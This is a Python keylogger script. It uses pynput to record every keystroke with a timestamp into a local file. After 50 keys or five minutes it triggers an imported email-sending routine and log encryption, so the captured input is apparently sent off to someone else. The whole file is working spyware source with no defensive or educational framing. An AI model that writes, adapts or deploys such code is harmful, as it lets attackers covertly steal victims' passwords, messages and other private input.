import os
import time
import logging
from pynput import keyboard
from datetime import datetime
from email_sender import send_email
from encrypt_log import encrypt_log

# Initialize global variables
log_file = "key_log.txt"
key_count = 0
last_sent_time = time.time()

# Configuring logging
logging.basicConfig(
    filename="actions_log.txt",
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def on_press(key):
    """
    Captures keystrokes, logs them to a file, and triggers email sending
    if 50 keystrokes are recorded or if 5 minutes have passed.
    """
    global key_count, last_sent_time

    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with open(log_file, "a") as file:
            if hasattr(key, 'char'):  # Regular key
                file.write(f"{current_time} - {key.char}\n")
            else:  # Special keys (e.g., Shift, Enter)
                file.write(f"{current_time} - [Special Key: {key}]\n")

        key_count += 1

    except Exception as e:
        logging.error(f"Error writing to log file: {e}")

    # Email trigger: Either 50 keystrokes or 5 minutes passed
    if key_count >= 50 or (time.time() - last_sent_time > 300):  # 5 minutes
        try:
            send_email()
            encrypt_log()
            key_count = 0  # Reset counter
            last_sent_time = time.time()  # Update last email sent time
        except Exception as e:
            logging.error(f"Error sending email or encrypting log: {e}")

def on_release(key):
    """
    Stops the keylogger when the Esc key is pressed.
    """
    if key == keyboard.Key.esc:
        logging.info("Keylogger stopped by user.")
        return False  # Stop listener

# Ensure script handles errors gracefully
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    logging.info("Keylogger interrupted manually.")
except Exception as e:
    logging.error(f"Unexpected error: {e}")
